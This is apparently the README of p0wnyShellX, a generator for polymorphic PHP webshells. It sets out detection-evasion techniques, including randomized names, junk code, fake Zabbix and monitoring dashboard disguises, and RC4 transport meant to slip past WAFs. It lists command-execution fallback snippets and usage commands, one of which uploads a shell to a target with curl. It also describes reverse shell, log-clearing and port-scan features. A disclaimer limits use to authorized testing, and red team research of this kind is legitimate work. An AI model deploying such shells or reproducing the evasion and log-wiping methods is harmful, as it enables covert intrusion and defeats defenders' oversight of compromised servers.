<div id="top" align="center">

[![License][license-shield]](LICENSE)
[![Python][python-shield]](https://www.python.org/)
[![PHP][php-shield]](https://www.php.net/)
[![Release][release-shield]](https://github.com/franckferman/p0wnyShellX/releases)
[![CI][ci-shield]](https://github.com/franckferman/p0wnyShellX/actions)


**Polymorphic PHP webshell generator for authorized red team operations.**  
*A unique shell on every run. No two deployments share the same signature.*

</div>

---

## What is p0wnyShellX

p0wnyShellX is a **polymorphic generator** for post-exploitation PHP webshells, forked and heavily extended from [p0wny-shell](https://github.com/flozz/p0wny-shell).

The original p0wny-shell and most derivatives ship a **static file** — every deployment is byte-for-byte identical, making YARA/AV/SIEM detection trivial. p0wnyShellX solves this: instead of a static webshell, you run a Python generator that produces a **unique PHP file every time**, with randomized function names, routing tokens, junk code, bcrypt-hashed credentials, CSS themes, and a configurable AJAX transport layer.

```mermaid
flowchart LR
    A["python3 p0wnyShellX.py<br/>-p 'MyPass!' -o shell.php"]

    subgraph engine ["Polymorphic Engine"]
        B1["Random function names<br/>PHP + JS — 250+ pool"]
        B2["Random routing tokens<br/>?x4r9tz=k2m8jvn"]
        B3["Bcrypt hash — cost=12<br/>plaintext never stored"]
        B4["Junk functions<br/>20–80 decoys per run"]
        B5["CSS theme<br/>11 named + poly + none"]
        B6["Shuffled exec order<br/>new chain per build"]
        B7["AJAX transport<br/>plain / mimic / rc4"]
    end

    C["shell.php<br/>unique signature — never the same"]

    A --> engine
    engine --> C

    style engine fill:#0d1117,stroke:#27ae60,color:#ccc
    style A fill:#111,stroke:#27ae60,color:#ccc
    style C fill:#111,stroke:#27ae60,color:#27ae60
```



---

## Feature comparison

| Feature | p0wny-shell | p0wnyShellX |
|---|---|---|
| Authentication | None | Login form + session |
| Password storage | — | bcrypt cost=12 (via `password_verify`) |
| Timing-safe auth | — | `hash_equals` on username + `password_verify` |
| Static signature | Yes — every deploy identical | **No** — every deploy unique |
| Function names | Fixed (`featureShell`, etc.) | Random from 250+ business name pool |
| JS variable names | Fixed | Random |
| HTML element IDs | Fixed | Random tokens |
| Routing endpoints | Fixed `?feature=shell` | Random tokens (e.g. `?x4r9tz=k2m8jvn`) |
| Junk code | None | 20–80 dynamically generated decoy functions |
| Exec fallback order | Fixed | Weighted shuffle per run + random method drop |
| CSS camouflage | Transparent webshell | 11 camouflage themes + `poly` (random palette per build) + `none` (no CSS) |
| Password in file | — | bcrypt hash only — plaintext never stored |
| Reproductible builds | Yes (static) | Via `--seed` flag |

---

## Compared to Weevely

[Weevely](https://github.com/epinna/weevely3) is the reference CLI webshell for red teamers. The two tools solve different problems — they can complement each other.

| Feature | Weevely | p0wnyShellX |
|---|---|---|
| Authentication | MD5(password) as XOR key | bcrypt cost=12 + `password_verify` |
| Polymorphism | Variable shuffling + random string chunks | Business names, routing tokens, junk functions, bcrypt salt, exec order |
| Communication | XOR+gzip+base64 in POST body, obfuscated header/footer | 3 modes: `plain` (cleartext), `mimic` (base64 + random param names), `rc4` (RC4 + per-build shuffled base64 alphabet) |
| Interface | Python CLI client | Browser terminal — no tooling on operator machine |
| Camouflage | Bare PHP snippet | Fake monitoring dashboard (3 themes) |
| Modules | 30+ (reverse shell, SQL, net scan, proxy…) | Shell, upload, download, tab-complete, reverse shell, log clearing, port scan |
| Exec methods | 9 — `exec`, `shell_exec`, `system`, `passthru`, `popen`, `proc_open`, `pcntl_fork`, `python_eval`, `perl_system` — shuffled | 4–6 per build — `exec`, `shell_exec`, `system` always present; `passthru`, `popen`, `proc_open` randomly dropped (~30% each); weighted order (reliable methods tend first) |
| `disable_functions` bypass | Yes — mod_cgi + `.htaccess` (Apache only, requires `AllowOverride` + write access) | No — not planned as a priority; the technique requires Apache + mod_cgi + AllowOverride + web-writable directory, which are rarely all met in prod |
| Reverse shell | Yes | Yes — `revshell <IP> <PORT>` (bash → python3 → perl → php, first available) |
| Log clearing | Yes | Yes — `clearlog <file> <pattern>` strips matching lines in-place |
| Port scan | Yes | Yes — `portscan <ip[-range]> <ports>` via fsockopen from the target host |
| SQL console | Yes | No |

**Use Weevely when**: you need CLI automation, module ecosystem (SQL, reverse shell, scan), or obfuscated HTTP transport matters more than visual camouflage.

**Use p0wnyShellX when**: browser access is your only option, per-deploy unique signatures are the priority, or themed camouflage helps the shell survive visual inspection.

---

## How the polymorphism works

### 1. Function name randomization

Every PHP and JS function is assigned a name drawn at random from a pool of 250+ plausible business names (`archiveReplicationLog`, `fetchComplianceStatus`, `validateSchemaCompatibility`…). A new mapping is generated on each run.

```
# Run 1                          # Run 2
function archiveReplicationLog   function validateSchemaCompatibility
function fetchComplianceStatus   function computePipelineThroughput
```

The pool names are intentionally generic — they are indistinguishable from functions found in any real monitoring dashboard, CMS plugin, or enterprise PHP app. Writing a YARA rule on `fetchClusterStatus` or `validateCertificateChain` would produce massive false positives on legitimate codebases, making such a rule unusable in production. The only detectable artifact is the pool itself inside `p0wnyShellX.py` — but the generator never touches the target. The deployed shell contains only 15–20 names drawn from that pool, with no recognizable pattern left.

On top of that, junk functions and randomized routing tokens add further noise: each build looks like a different application, not a variant of the same tool.

> **Design note — why no random numeric suffix (`fetchClusterStatus_4823`):** appending digits would make every name look machine-generated at a glance — no real PHP codebase does this. It would destroy the "legitimate app" camouflage and, worse, create its own YARA signature (`[a-zA-Z]+_\d+`). The pool size (275 names, ~20 drawn per build) already makes per-build combinations astronomically large; suffixes add risk, not safety.

### 2. Routing token randomization

The AJAX routing parameter `?feature=` and its values (`shell`, `hint`, `pwd`, `upload`) are replaced by random alphanumeric tokens generated at build time and injected coherently into both PHP and JS.

```
# Original (static, detectable)
POST /?feature=shell

# Generated (unique per run)
POST /?x4r9tz=k2m8jvn
POST /?x4r9tz=p3nq7as
```

### 3. Bcrypt password hashing

The generator calls PHP at build time to compute a `bcrypt cost=12` hash of the password. The hash is embedded in the generated file; the plaintext never appears. Because bcrypt salts are random, the hash differs on every run even for the same password.

```php
# What gets stored in the generated file:
define('PHSH_R7VX2', '$2y$12$oEYz4jk/0pa1K...');

# Auth check:
function validateClusterState(string $login, string $pass): bool {
    return hash_equals($login, AUSR_5KQP) && password_verify($pass, PHSH_R7VX2);
}
```

### 4. Exec fallback chain — weighted shuffle + random drop

The shell tries multiple PHP execution functions in sequence until one succeeds. Every build applies two independent layers of variance to this chain.

**Layer 1 — composition: which methods are present**

Methods are split into two tiers:

| Tier | Methods | Behaviour |
|---|---|---|
| Core | `exec`, `shell_exec`, `system` | Always included |
| Optional | `passthru`, `popen`, `proc_open` | Each has a 30% chance of being dropped independently |

The three optional draws are independent — like three separate coin flips. Probabilities:

| Methods in build | How | Probability |
|---|---|---|
| 6 | All 3 optional survive: `0.7 × 0.7 × 0.7` | ~34% |
| 5 | Exactly 1 dropped: `3 × (0.7 × 0.7 × 0.3)` | ~44% |
| 4 | Exactly 2 dropped: `3 × (0.7 × 0.3 × 0.3)` | ~19% |
| 4 | All 3 dropped (`0.3³ ≈ 3%`) → 1 re-added by force | ~3% |

Most builds (78%) will have 5 or 6 methods. The rare 4-method build is never fewer than 4 — the generator always re-adds one optional if all three were dropped.

**Layer 2 — order: in what sequence they appear**

The active methods are assembled in a weighted random order. Each method has an internal weight:

```
exec (5) > shell_exec (4) > system (3) > passthru = popen = proc_open (2)
```

At each position, a method is drawn proportionally to its remaining weight. This means `exec` and `shell_exec` appear first in most builds, but the order is never fixed — it is re-rolled every run.

The weight hierarchy reflects practical reliability per method:

**`exec` — weight 5 (core)**
```php
exec($cmd, $_out);
$output = implode("\n", $_out);
```
Runs the command via `/bin/sh -c`. Output is captured into `$_out` by reference as an array of lines — no stdout redirection, no buffering functions needed. Cleanest capture path. `exec` is the most commonly available PHP exec function on servers where the group is only partially restricted.

**`shell_exec` — weight 4 (core)**
```php
$output = (string) shell_exec($cmd);
```
Functional equivalent of the backtick operator — same internal handler in PHP. Returns the full output as a string. Slightly lower weight than `exec` because it returns `null` on error with no distinction from an empty output, making silent failures harder to detect. If `shell_exec` is in `disable_functions`, the backtick `` `$cmd` `` is also blocked — they share the same PHP handler.

**`system` — weight 3 (core)**
```php
ob_start(); system($cmd); $output = ob_get_contents(); ob_end_clean();
```
Writes output directly to stdout — requires three output buffering functions (`ob_start`, `ob_get_contents`, `ob_end_clean`) to capture it into a variable. If any of those is also in `disable_functions`, the method silently returns nothing. The `ob_start(); system(...); ob_get_contents()` pattern is itself a known YARA signature for PHP webshells.

**`passthru` — weight 2 (optional)**
```php
ob_start(); passthru($cmd); $output = ob_get_contents(); ob_end_clean();
```
Identical to `system` in terms of capture mechanics — same `ob_*` dependency, same failure surface. Designed for raw binary output (no newline translation). Slightly less common than `system` in legitimate PHP codebases, so its presence is marginally more suspicious. Droppable.

**`popen` — weight 2 (optional)**
```php
$h = popen($cmd, 'r');
if (is_resource($h)) {
    while (!feof($h)) { $output .= fread($h, 4096); }
    pclose($h);
}
```
Opens a pipe to the process and returns a file handle. Requires a read loop with `fread` and explicit `pclose`. More moving parts than the above — the stream can return partial output if the handle closes early or the process produces no output before the first `feof` check. `popen` has legitimate uses (reading compressed streams, running scripts) so it is sometimes left out of `disable_functions` on partially hardened servers. Droppable.

**`proc_open` — weight 2 (optional)**
```php
$desc = [1 => ['pipe','w'], 2 => ['pipe','w']];
$pr = proc_open($cmd, $desc, $pipes);
if (is_resource($pr)) {
    $output = stream_get_contents($pipes[1]);
    fclose($pipes[1]);
    proc_close($pr);
}
```
Most capable of the six — gives full control over stdin, stdout and stderr as separate pipes. Requires `$pipes` array management, `stream_get_contents`, and `proc_close`. Most complex failure surface: any step failing silently means no output. Weight is low for this reason. Added specifically because sysadmins frequently omit it from `disable_functions` — making it available on servers where all other methods are blocked. Acts as a last-resort fallback, not a primary path. Droppable.

```
# Three example builds
Build A : exec → shell_exec → system → popen → proc_open        (5 methods)
Build B : shell_exec → exec → popen → system                    (4 methods)
Build C : exec → system → shell_exec → passthru → popen → proc_open  (6 methods)
```

**Why this matters for detection**

A YARA rule targeting exec methods needs to commit to a specific set: "file contains `passthru` AND `popen` AND `proc_open`". That rule misses any build where one or more of those was dropped. A looser rule ("contains at least one of…") matches half the PHP on the internet. Neither is operationally viable at scale.

### 5. Dynamic junk code

Between 20 and 80 decoy PHP functions are generated per run, drawn from 20 body templates × 250+ name combinations, with randomized return values, loop counts, and string literals. They are scattered around the functional core to increase noise ratio.

### 6. AJAX transport modes

Every AJAX request between the browser and the shell carries parameters (`cmd`, `cwd`, `filename`…). In `plain` mode these are sent as-is. The `--transport` flag replaces this with one of three per-build traffic profiles:

**`plain` (default)** — no encoding, parameters sent as cleartext POST fields.
```
POST /?x4r9tz=k2m8jvn
cmd=id&cwd=%2Fvar%2Fwww
```
Low anomaly score. Suitable for environments without deep packet inspection. Default for a reason: high-entropy bodies (see below) can be more suspicious than plain text on ML-based sensors.

**`mimic`** — parameter names replaced by names drawn at random from a real-world webapp pool (`query`, `payload`, `ctx`, `token`…), values base64-encoded.
```
POST /?x4r9tz=k2m8jvn
payload=aWQ%3D&ctx=L3Zhci93d3c%3D
```
Looks like a standard API call. Parameter names change every build — no two mimic shells share the same names.

**`rc4`** — RC4 stream cipher + per-build shuffled base64 alphabet. Both the 16-byte key and the alphabet are generated at build time and baked into both PHP and JS.
```
POST /?x4r9tz=k2m8jvn
nonce=Ht3kVz9q...
```
POST body is opaque to regex-based WAF inspection. Note: high-entropy bodies are a signal for ML-based sensors (Darktrace, Vectra) — use only when the network has WAF coverage but no behavioral analytics.

> The entropy trade-off is why `plain` is the default. On most targets, blending into normal traffic is safer than encrypting everything.

### 7. CSS theme polymorphism

The visual shell layer adds a third axis of variance beyond code and traffic.

**Named themes** (`infra-dark`, `corporate-blue`, `matrix`, `zabbix`, `ctos`, `fsociety`, `russia`, `korea`, `france`, `usa`, `redux`) each have a fixed but distinct color palette and a fake application name. When omitted, the generator picks one at random — YARA rules cannot assume a stable color set.

**`--theme poly`** generates a fully randomized HSL palette on every build: base hue (0–359°), complementary accent hue, per-channel lightness and saturation offsets. App name is drawn from a 20-entry pool. Both the colors and the name differ on every run — there is no stable CSS property value or app string a rule can anchor to.

```
# Same command, different CSS every time
Build A : hsl(213,15%,10%) bg, hsl(43,65%,55%) accent, "Cluster Console v1"
Build B : hsl(71,12%,9%)  bg, hsl(251,70%,58%) accent, "Grid Terminal build-"
```

**`--theme none`** strips all themed CSS. Colors fall back to generic black/gray values used by millions of pages; the login header title is empty. No CSS-based detection rule can fire on values that are indistinguishable from the browser default stylesheet.

---

## Requirements

- **Python 3.8+**
- **PHP 8.x CLI** — used by the generator to compute the bcrypt hash at build time

```bash
# Verify
python3 --version
php --version
```

---

## Installation

```bash
git clone https://github.com/franckferman/p0wnyShellX
cd p0wnyShellX
```

No dependencies to install. `p0wnyShellX.py` uses only the Python standard library.

---

## Usage

```bash
python3 p0wnyShellX.py [OPTIONS]
```

### Options

**Output**

| Flag | Short | Default | Description |
|---|---|---|---|
| `--output` | `-o` | `shell.php` | Output filename (or full path) |
| `--outdir` | `-d` | `.` | Output directory — combined with `-o` for the filename |
| `--stdout` | — | false | Print PHP to stdout instead of a file. Status messages go to stderr. Useful for piping. |

**Authentication**

| Flag | Short | Default | Description |
|---|---|---|---|
| `--password` | `-p` | `changeme666` | Login password |
| `--user` | `-u` | `sysadmin` | Login username |
| `--no-auth` | — | false | Strip all auth: no login form, no session, no bcrypt. Shell is directly accessible. |

**Polymorphism**

| Flag | Short | Default | Description |
|---|---|---|---|
| `--junk` | `-j` | random 20–80 | Number of junk functions (max 200) |
| `--no-junk` | — | false | Disable junk function generation |
| `--theme` | `-t` | random | CSS theme. `poly` = random palette per build, `none` = no CSS (see table below) |
| `--seed` | `-s` | — | Fixed RNG seed for reproducible output |
| `--transport` | — | `plain` | AJAX encoding: `plain` / `mimic` / `rc4` |

**Optional shell features** *(opt-in — not compiled unless flag is passed)*

| Flag | Compiles | Description |
|---|---|---|
| `--revshell` | `revshell` command | Reverse shell via bash → python3 → perl → php fallback |
| `--clearlog` | `clearlog` command | Strip regex-matching lines from a log file in-place |
| `--portscan` | `portscan` command | TCP port scan from the target host |
| `--pingsweep` | `pingsweep` command | TCP-based host discovery from the target host |

### Examples

```bash
# Minimal — password only
python3 p0wnyShellX.py -p "MyPass123!" -o shell.php

# Custom output directory + filename
python3 p0wnyShellX.py -p "MyPass123!" -d /var/www/html/ -o monitor.php

# Print to stdout — useful for piping or file upload chains
python3 p0wnyShellX.py -p "MyPass123!" --stdout 2>/dev/null > shell.php
python3 p0wnyShellX.py -p "MyPass123!" --stdout 2>/dev/null | curl -F "file=@-" http://target/upload

# No-auth shell — no login form, direct access (magic file upload, quick tests)
python3 p0wnyShellX.py --no-auth --no-junk -t none -o shell.php

# Full control
python3 p0wnyShellX.py \
  -p "MyPass123!" \
  -u operator \
  -j 60 \
  -t matrix \
  -o /tmp/shell_$(date +%s).php

# Reproducible (same output across runs — for testing)
python3 p0wnyShellX.py -p "MyPass123!" --seed 42 -o shell.php

# Minimal output (no junk, fastest generation)
python3 p0wnyShellX.py -p "MyPass123!" --no-junk -o shell.php

# Polymorphic CSS — random palette, random app name, unique signature per build
python3 p0wnyShellX.py -p "MyPass123!" -t poly -o shell.php

# No CSS theme — bare terminal, no color/header signature for CSS-based rules
python3 p0wnyShellX.py -p "MyPass123!" -t none -o shell.php

# Zabbix camouflage — blends into Zabbix monitoring environments
python3 p0wnyShellX.py -p "MyPass123!" -t zabbix -o shell.php

# Mimic mode — random param names, standard base64, blends into normal web traffic
python3 p0wnyShellX.py -p "MyPass123!" --transport mimic -o shell.php

# RC4 mode — RC4 + shuffled base64 alphabet, unique per build, WAF-blind
python3 p0wnyShellX.py -p "MyPass123!" --transport rc4 -o shell.php

# Shell with all optional features compiled in
python3 p0wnyShellX.py -p "MyPass123!" --revshell --clearlog --portscan --pingsweep -o shell.php
```

---

## Shell commands

Once deployed and authenticated, the shell supports:

| Command | Description |
|---|---|
| `<any command>` | Execute shell command, output displayed |
| `cd /path` | Change working directory (persisted across commands) |
| `download /path/to/file` | Download file to browser |
| `upload /remote/path` | Upload local file via browser dialog |
| `clear` | Clear terminal output |
| `Tab` | Autocomplete files and commands |
| `↑ / ↓` | Command history navigation |
| `Ctrl+L` | Clear screen |
| `Ctrl+C` | Cancel current input |
| `Ctrl+U` | Clear input line |

**Optional commands** *(compiled only if the corresponding flag was passed at generation time)*

| Command | Full syntax | Description |
|---|---|---|
| `revshell` | `revshell <IP> <PORT> [--method bash\|python3\|perl\|php]` | Reverse shell. Fallback chain: bash → python3 → perl → php. `--method` forces a specific binary. |
| `clearlog` | `clearlog <file> <pattern>` | Strip lines matching `<pattern>` (case-insensitive regex) in-place from `<file>`. |
| `portscan` | `portscan <target> <ports> [--stealth\|--fast] [--timeout N] [--pause N]` | TCP scan from the target host. |
| `pingsweep` | `pingsweep <target> [--ports <list>] [--stealth\|--fast] [--timeout N] [--pause N]` | TCP-based host discovery from the target host. |

**portscan / pingsweep — target formats**

| Format | Example |
|---|---|
| Single IP | `192.168.0.1` |
| Last-octet range | `192.168.0.1-254` |
| Full IP range | `192.168.0.1-192.168.0.50` |
| Comma list | `192.168.0.1,10.0.0.5,172.16.0.1` |
| CIDR | `192.168.0.0/24` |
| Mixed | `192.168.0.0/24,10.0.0.1` |

**portscan — port formats and presets**

| Value | Ports |
|---|---|
| `minimal` | 22, 80, 443 |
| `web` | 80, 443, 8080, 8443, 8000, 8888, 3000, 5000, 4848, 9200 |
| `top20` | 20 most common ports (nmap reference) |
| `top100` | 100 most common ports (nmap reference) |
| `22,80,443` | Custom comma list |
| `22-100` | Custom range |

**portscan / pingsweep — scan modes**

Modes define timing. `--timeout` and `--pause` override the mode preset if specified.

| Mode | Timeout | Pause between connections |
|---|---|---|
| `--fast` | 0.1 s | 0 ms |
| *(default)* | 0.3 s | 0 ms |
| `--stealth` | 2.0 s | 500 ms |
| `--timeout N` | custom | — |
| `--pause N` | — | custom (ms) |

**pingsweep — probe port presets** (`--ports`)

| Value | Ports tried per host |
|---|---|
| *(default)* | 80, 443, 22 |
| `minimal` | 22, 80 |
| `web` | 80, 443, 8080, 8443 |
| `full` | 22, 80, 443, 8080, 3389, 3306, 5432, 6379, 27017 |
| `N,N,...` | Custom list |

---

## CSS Themes

Omit `--theme` to pick at random from the named themes below (`poly` and `none` are excluded from random selection).

| Theme | Palette | Fake app name | Target environment |
|---|---|---|---|
| `infra-dark` | Green on dark | Resource Monitor | Generic Linux infra dashboards |
| `corporate-blue` | Blue on dark | InfraOps Console | Enterprise / GitHub-like environments |
| `matrix` | Green on black | SysCore Terminal | High contrast / classic terminal |
| `zabbix` | Orange on dark blue | Zabbix Frontend | Environments running Zabbix monitoring |
| `ctos` | Cyan/green on deep navy | ctOS Interface | Smart city / network ops centers |
| `fsociety` | Red accent, monochrome | Secure Shell | Dark minimal / red team aesthetic |
| `russia` | Red + blue on near-black | Federal Monitor | Red/blue/white palette |
| `korea` | Red on black | Monitoring System | Stark high-contrast red |
| `france` | Red + blue on navy | Tableau de Bord | French flag palette |
| `usa` | Navy + red | Federal Operations | American flag palette |
| `redux` | Purple on dark | State Inspector | React/Redux developer tool camouflage |
| `poly` | Fully random HSL per build | Random from pool | No stable color signature to target |
| `none` | Generic black/gray, no header | *(none)* | Maximum opacity against CSS-based YARA rules |

---

---

## CI/CD

Every push to a version tag (`v*.*.*`) triggers a GitHub Actions workflow that:

1. Installs Python 3.11 and PHP 8.3
2. Generates an example shell with default credentials
3. Runs `php -l` syntax validation
4. Verifies absence of static signatures
5. Publishes a GitHub Release with `p0wnyShellX.py` and the example shell as assets

On every push/PR, the CI also runs a polymorphism validation suite:
- Generates 9 shells (named themes, `--theme poly`, `--theme none`, junk levels, and transport modes)
- Checks PHP syntax on all
- Confirms no static signatures remain
- Confirms two consecutive runs produce different output
- Verifies mimic transport uses randomized param names
- Verifies rc4 transport injects `tEnc`/`tDec` and no plain param names
- Verifies exec fallback chain integrity on all non-transport shells

---

## Security notes

- The bcrypt hash in the generated file is irreversible without brute-force
- `hash_equals` on username prevents timing oracle attacks
- `password_verify` is constant-time for the password comparison
- Session uses `cookie_httponly`, `use_strict_mode`, `cookie_samesite: Lax`
- Wrong password triggers a random 400–700ms delay (anti-bruteforce)

---

## Interactive command builder

**[franckferman.github.io/p0wnyShellX](https://franckferman.github.io/p0wnyShellX/)** — browser-based tool to configure and copy `p0wnyShellX.py` commands. Preset tabs (quick, infra-dark, corporate, matrix, poly, none, minimal) and a live custom builder with all 13 themes, transport, junk, and output fields.

---

## Legal disclaimer

This tool is intended for **authorized penetration testing, red team engagements, and security research only**. Use it only on systems you own or have explicit written permission to test. Unauthorized use against systems you do not own is illegal. The author assumes no liability for misuse.

---

## License

GNU Affero General Public License v3.0 — see [LICENSE](LICENSE).

---

<!-- SHIELDS -->
[license-shield]: https://img.shields.io/github/license/franckferman/p0wnyShellX.svg?style=for-the-badge
[python-shield]: https://img.shields.io/badge/Python-3.8+-3776AB?style=for-the-badge&logo=python&logoColor=white
[php-shield]: https://img.shields.io/badge/PHP-8.x-777BB4?style=for-the-badge&logo=php&logoColor=white
[release-shield]: https://img.shields.io/github/v/release/franckferman/p0wnyShellX?style=for-the-badge
[ci-shield]: https://img.shields.io/github/actions/workflow/status/franckferman/p0wnyShellX/ci.yml?style=for-the-badge&label=CI
